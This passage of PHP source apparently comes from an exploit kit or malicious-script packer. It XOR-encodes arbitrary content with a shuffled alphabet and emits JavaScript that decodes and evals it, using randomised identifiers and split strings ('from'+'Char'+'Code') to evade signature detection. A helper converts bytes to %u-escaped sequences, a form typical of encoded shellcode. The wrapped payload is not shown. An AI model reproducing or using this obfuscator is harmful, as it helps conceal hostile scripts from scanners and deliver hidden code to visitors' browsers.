		$table = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_@";
		$xor   = rand(5,255);
		$table = array_keys(count_chars($table, 1));
		$i_min = min($table);
		$i_max = max($table);
		$r = 0;
		$enc="";
		
		for ($c = count($table); $c > 0; $r = mt_rand(0, $c--)) array_splice($table, $r, $c - $r, array_reverse(array_slice($table, $r, $c - $r)));
		$len = strlen($content);
		$word = $shift = 0;
		
		for ($i = 0; $i < $len; $i++)
		{
			$ch = $xor ^ ord($content[$i]);
			$word |= ($ch << $shift);
			$shift = ($shift + 2) % 6;
			$enc .= chr($table[$word & 0x3F]);
			$word >>= 6;
			
			if (!$shift)
			{
				$enc .= chr($table[$word]);
				$word >>= 9;
			}
		}
		
		if ($shift) $enc .= chr($table[$word]);
		
		$tbl = array_fill($i_min, $i_max - $i_min + 1, 0);
		
		while (list($k,$v) = each($table)) $tbl[$v] = $k;
		
		$tbl = implode(",", $tbl);

		
		$func_name = get_random_string( rand( 3,12 ) );
		$func_param = get_random_string( rand( 3,12 ) );
		$l_param = get_random_string( rand( 3,12 ) );
		$b_param = get_random_string( rand( 3,12 ) );
		$i_param = get_random_string( rand( 3,12 ) );
		$j_param = get_random_string( rand( 3,12 ) );
		$r_param = get_random_string( rand( 3,12 ) );
		$p_param = get_random_string( rand( 3,12 ) );
		$s_param = get_random_string( rand( 3,12 ) );
		$w_param = get_random_string( rand( 3,12 ) );
		$t_param = get_random_string( rand( 3,12 ) );
		$buffer = get_random_string( rand( 3,12 ) );
		$null = get_random_string( rand( 3,12 ) );
		$f_fromCharCode = get_random_string( rand( 3,12 ) );
		$p_fromCharCode = get_random_string( rand( 3,12 ) );

		$r= '
			function '.$f_fromCharCode.'('.$p_fromCharCode.'){
		      return String["from"+"Char"+"Code"]('.$p_fromCharCode.');
			}
			function '.$func_name.'('.$func_param.'){
				var '.$null.'=0,
					'.$l_param.'='.$func_param.'.length,
					'.$b_param.'=1024,
					'.$i_param.',
					'.$j_param.',
					'.$r_param.'="",
					'.$p_param.'='.$null.',
					'.$s_param.'='.$null.',
					'.$w_param.'='.$null.',
					'.$t_param.'=Array('.$tbl.');
				for('.$j_param.'=Math.ceil('.$l_param.'/'.$b_param.');'.$j_param.'>'.$null.';'.$j_param.'--)
				{
					for(eval("'.$i_param.'=Ma"+"th.m"+"in('.$l_param.','.$b_param.')");'.$i_param.'>'.$null.';'.$i_param.'--,'.$l_param.'--)
					{
						'.$w_param.'|=('.$t_param.'['.$func_param.'.charCodeAt('.$p_param.'++)-'.$i_min.'])<<'.$s_param.';
						if('.$s_param.'){
							'.$r_param.'+='.$f_fromCharCode.'('.$xor.'^'.$w_param.'&255);
							'.$w_param.'>>=8;
							'.$s_param.'-=2;
						}
						else{
							'.$s_param.'=6;
						}
					}
				}
				return('.$r_param.');
			}
			var '.$buffer.'="'.$enc.'";
			eval('.$func_name.'('.$buffer.'));
	';

		return $r;
	}

	function unescape($s){
		$out = "";
		$res=strtoupper(bin2hex($s));
		$g = round(strlen($res)/4);
		if ($g != (strlen($res)/4)) $res.="00";
		for ($i=0; $i<strlen($res);$i+=4)
			$out.="%u".substr($res,$i+2,2).substr($res,$i,2);
		return $out;
	}

?>
